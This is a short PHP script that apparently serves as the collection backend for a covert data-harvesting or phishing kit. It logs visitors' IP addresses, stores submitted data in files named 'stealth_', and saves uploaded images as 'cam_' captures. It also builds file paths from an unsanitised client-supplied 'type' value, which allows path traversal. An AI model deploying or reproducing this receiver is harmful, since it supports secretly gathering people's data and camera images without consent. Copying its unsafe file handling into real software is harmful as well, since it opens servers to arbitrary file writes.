<?php
$data_dir = __DIR__ . '/../output/';
$timestamp = date('Y-m-d H:i:s');
$ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['REMOTE_ADDR'];

// Handle POST data
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $input = json_decode(file_get_contents('php://input'), true);
    if ($input) {
        $type = strtolower(str_replace(' ', '_', $input['type']));
        $log_file = $data_dir . $type . '.txt';
        $log_entry = "[$timestamp] IP: $ip\n";
        $log_entry .= print_r($input['data'], true) . "\n---\n";
        file_put_contents($log_file, $log_entry, FILE_APPEND);
        echo json_encode(['status' => 'ok']);
        exit;
    }
}

// Handle GET requests
if (isset($_GET['type']) && isset($_GET['data'])) {
    $log_file = $data_dir . 'stealth_' . date('Ymd') . '.txt';
    $log_entry = "[$timestamp] IP: $ip | Type: {$_GET['type']} | Data: {$_GET['data']}\n";
    file_put_contents($log_file, $log_entry, FILE_APPEND);
    echo "OK";
    exit;
}

// Handle image uploads
if (isset($_FILES['image'])) {
    $filename = $data_dir . 'cam_' . date('Ymd_His') . '.png';
    move_uploaded_file($_FILES['image']['tmp_name'], $filename);
    echo json_encode(['status' => 'ok']);
    exit;
}

echo json_encode(['status' => 'error']);
?>
